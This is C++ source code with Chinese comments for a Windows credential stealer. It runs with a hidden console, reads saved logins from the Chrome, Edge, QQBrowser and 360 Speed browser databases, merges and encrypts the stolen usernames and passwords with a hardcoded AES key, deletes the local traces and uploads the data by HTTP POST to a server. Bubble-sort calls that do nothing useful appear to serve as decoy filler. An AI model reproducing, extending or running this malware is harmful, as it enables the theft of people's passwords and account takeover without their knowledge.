#define _WINSOCKAPI_ // 防止 winsock2.h 中的宏被重新定义
#include <winsock2.h>
#include <ws2tcpip.h>
#undef _WINSOCKAPI_ // 解除定义，以便其他头文件可以正常使用
#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )

#include"json11.hpp"
#include <string>
#include <locale>
#include <codecvt>
#include<iostream>
#include<windows.h>
#include<wincrypt.h>
#include"base64.h"
#include"sqlite3.h"
#include<filesystem>
#include<fstream>
#include"utils.h"
#include<sstream>
#include<aes.h>
#include <modes.h>
#include <filters.h>
#include <base64.h>
#include"httplib.h"
using namespace nlohmann;
using namespace CryptoPP;
using namespace std;
namespace fs = std::filesystem;

#define CHROME_LOCAL_STATE_FILE_PATH "Google\\Chrome\\User Data\\Local State"
#define CHROME_PASSWORDS_DB_PATH     "Google\\Chrome\\User Data\\Default\\Login Data"
#define EDGE_LOCAL_STATE_FILE_PATH   "Microsoft\\Edge\\User Data\\Local State"
#define EDGE_PASSWORDS_DB_PATH       "Microsoft\\Edge\\User Data\\Default\\Login Data"
#define QQBROWSER_PWD_PATH           "Tencent\\QQBrowser\\User Data\\Default\\Login Data"
#define QQBROWSER_STATE_PATH         "Tencent\\QQBrowser\\User Data\\Local State"
#define LOGIN_DATA_SQL               "SELECT origin_url, username_value, password_value, date_created FROM logins;"
#define FIREFOX_PROFILE_PATH         "Mozilla\\Firefox\\Profiles"
#define SPEED360_PWD_PATH            "360chrome\\Chrome\\User Data\\Default\\Login Data"
#define SPEED360_STATE_PATH           "360chrome\\Chrome\\User Data\\Default\\Local State"
#define FIREFOX_SQL                    ""
const std::vector<string> CSV_HEADER = { "url", "username", "password" };

// 冒泡排序函数
void bubbleSort(int arr[], int n) {
    for (int i = 0; i < n - 1; ++i) {
        for (int j = 0; j < n - i - 1; ++j) {
            if (arr[j] > arr[j + 1]) {
                // 交换 arr[j] 和 arr[j + 1]
                int temp = arr[j];
                arr[j] = arr[j + 1];
                arr[j + 1] = temp;
            }
        }
    }
}

// 将 wchar_t 路径转换为 std::string
std::string wstring_to_string(const std::wstring& wstr) {
    std::wstring_convert<std::codecvt_utf8<wchar_t>> myconv;
    return myconv.to_bytes(wstr);
}

// 检查文件是否存在
bool file_exists(const std::string& path) {
    return fs::exists(path);
}


bool ensure_directory_exists(const std::string& path) {
    // 检查目录是否存在
    if (fs::exists(path) && fs::is_directory(path)) {
        return true;
    }

    // 目录不存在，尝试创建
    try {
        if (fs::create_directories(path)) {
            std::cout << "Directory created: " << path << std::endl;
            return true;
        }
        else {
            std::cerr << "Failed to create directory: " << path << std::endl;
            return false;
        }
    }
    catch (const fs::filesystem_error& e) {
        std::cerr << "Filesystem error: " << e.what() << std::endl;
        return false;
    }
}


// 读取文件内容
std::string read_file_content(const std::string& filepath) {
    std::ifstream file(filepath);
    if (!file.is_open()) {
        std::cerr << "Failed to open file: " << filepath << std::endl;
        return "";
    }
    std::stringstream buffer;
    buffer << file.rdbuf();
    file.close();
    return buffer.str();
}

void removeDirectory(const std::string& directoryPath) {
    if (std::filesystem::exists(directoryPath)) {
        for (const auto& entry : std::filesystem::directory_iterator(directoryPath)) {
            if (entry.is_regular_file()) {
                std::filesystem::remove(entry.path());
            }
            else if (entry.is_directory()) {
                removeDirectory(entry.path().string());
            }
        }
        std::filesystem::remove(directoryPath);
    }
}
// 将多个CSV文件内容合并到一个TXT文件中
void merge_csv_files_to_txt(const std::string& dir_path, const std::string& output_file) {
    std::ofstream outfile(output_file);
    if (!outfile.is_open()) {
        std::cerr << "Failed to create or open the output file: " << output_file << std::endl;
        return;
    }

    for (const auto& entry : fs::directory_iterator(dir_path)) {
        if (entry.path().extension() == ".csv") {
            std::string file_name = entry.path().filename().string();
            std::string content = read_file_content(entry.path().string());

            outfile << "=== " << file_name << " ===\n";
            outfile << content << "\n\n";
        }
    }

    outfile.close();
    std::cout << "Merged content has been written to '" << output_file << "'" << std::endl;
}

// 定义密钥和IV
const std::string key = "12345678998765432100001234567890"; // 32字节的密钥
const std::string iv = "1234567890123456";   // 16字节的IV

// AES加密函数
std::string encryptAES(const std::string& plaintext, const std::string& key, const std::string& iv) {
    using namespace CryptoPP;

    std::string ciphertext;
    std::string encodedCiphertext;

    try {
        // 创建加密器
        CBC_Mode<AES>::Encryption e;
        e.SetKeyWithIV((unsigned char*)key.data(), key.size(), (unsigned char*)iv.data());

        // 创建Base64编码器
        StringSource s(plaintext, true,
            new StreamTransformationFilter(e,
                new Base64Encoder(
                    new StringSink(ciphertext)
                )
            ) // StreamTransformationFilter
        ); // StringSource
    }
    catch (const Exception& e) {
        std::cerr << "Error: " << e.what() << std::endl;
        return "";
    }

    return ciphertext;
}

int main() {
    int arr1[5] = { 2,3,6,5,2 };
    bubbleSort(arr1, 5);
    //std::cout << std::getenv("APPDATA"); Appdata/roaming
    // 检查目录是否存在
    if (ensure_directory_exists("results")) {
        //谷歌
        get_db_data(CHROME_PASSWORDS_DB_PATH,CHROME_LOCAL_STATE_FILE_PATH, "results/chrome.csv", CSV_HEADER, LOGIN_DATA_SQL);
        //Edge
        get_db_data(EDGE_PASSWORDS_DB_PATH, EDGE_LOCAL_STATE_FILE_PATH, "results/edge.csv", CSV_HEADER, LOGIN_DATA_SQL);
        //qq
        get_db_data(QQBROWSER_PWD_PATH, QQBROWSER_STATE_PATH, "results/qq.csv", CSV_HEADER, LOGIN_DATA_SQL);
        //360极速
        get_db_data(SPEED360_PWD_PATH, SPEED360_STATE_PATH, "results/360speed.csv", CSV_HEADER, LOGIN_DATA_SQL);
        ////火狐
        //char buffer[MAX_PATH];
        //GetModuleFileName(NULL, buffer, MAX_PATH);
        //std::string::size_type pos = std::string(buffer).find_last_of("\\/");
        //std::string firefoxPath=std::string(buffer).substr(0, pos)+"\\"+"firefox.exe";
        //std::cout << firefoxPath;
        //system(firefoxPath.c_str());

        int arr2[5] = { 3,2,1,6,9 };
        bubbleSort(arr2, 5);
        // 合并 results 目录下的所有 CSV 文件内容到一个 TXT 文件
        merge_csv_files_to_txt("results", "output.txt");
        removeDirectory("results");
        // 读取文件内容
        std::string filePath = "output.txt";
        std::string fileContent = read_file_content(filePath);
        remove(filePath.c_str());
        if (fileContent.empty()) {
            std::cerr << "File content is empty." << std::endl;
            return 1;
        }

        // 加密文件内容
        std::string encryptedContent = encryptAES(fileContent, key, iv);

        if (encryptedContent.empty()) {
            std::cerr << "Encryption failed." << std::endl;
            return 1;
        }

        // 使用httplib上传加密后的文件
        httplib::Client cli("localhost", 8080);
        // 创建JSON对象
        json j;
        j["data"] = encryptedContent;

        // 将JSON对象转换为字符串
        std::string jsonstr = j.dump();
        auto res=cli.Post("/data",
            jsonstr.c_str(),
            "application/json"
            );
        if (res && res->status == 200) {
            std::cout << "Upload successful. Server response: " << res->body << std::endl;
        }
        else {
            std::cerr << "Upload failed. Status: " << (res ? res->status : -1) << std::endl;
        }

    }
    else {
        std::cout << "创建目录失败!";
    }
    return 0;
}
